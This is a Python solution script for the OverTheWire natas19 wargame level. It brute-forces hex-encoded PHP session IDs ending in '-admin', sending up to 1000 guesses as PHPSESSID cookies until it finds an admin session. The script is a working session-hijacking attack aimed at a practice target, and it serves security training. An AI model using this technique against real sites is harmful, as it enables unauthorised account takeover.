#!/usr/bin/env python3

import getpass
import requests

###############################################################################
# Configuration
###############################################################################

# The URL of the level as well as the username for it. There will be a known
# password as well, but read it from the user so that it is not published.
LEVEL_CURRENT = 'natas19'
LEVEL_NEXT = 'natas20'
URL = f'http://{LEVEL_CURRENT}.natas.labs.overthewire.org/index.php'

# The string used to determine if the session id is incorrect.
FAILURE_STRING = 'You are logged in as a regular user'

def get_authentication_credentials() -> tuple[str, str]:
    """Prompt the user for the password and return the authentication tuple."""
    password = getpass.getpass(prompt=f'Enter password for {LEVEL_CURRENT}: ')
    return LEVEL_CURRENT, password

def send_request(credentials: tuple[str, str], cookies: dict[str, str]) -> str:
    """
    Sends a request with the given authentication and cookies.
    Returns the response text or raises an exception on failure.
    """
    response = requests.get(URL, auth=credentials, cookies=cookies)
    response.raise_for_status()

    return response

def response_indicates_success(response: str) -> bool:
    if response.status_code != 200:
        raise RuntimeError(f"Unexpected response:\n{response.text}")
    else:
        return FAILURE_STRING not in response.text

def main():
    credentials = get_authentication_credentials()

    for i in range(1000):
        # Convert to hex string: 0 = 30, 1 = 31, 17 = 3137, 124 = 313234, etc
        i_hexed = ''.join(f"{ord(digit):02x}" for digit in str(i))
        # Append the hex for "-admin": 2d61646d696e
        session_id = i_hexed + '2d61646d696e'

        print(f'Trying { i }: PHPSESSID={ session_id }')
        response = send_request(credentials, { "PHPSESSID": session_id })

        if response_indicates_success(response):
            print(response.text)
            break

if __name__ == '__main__':
    main()
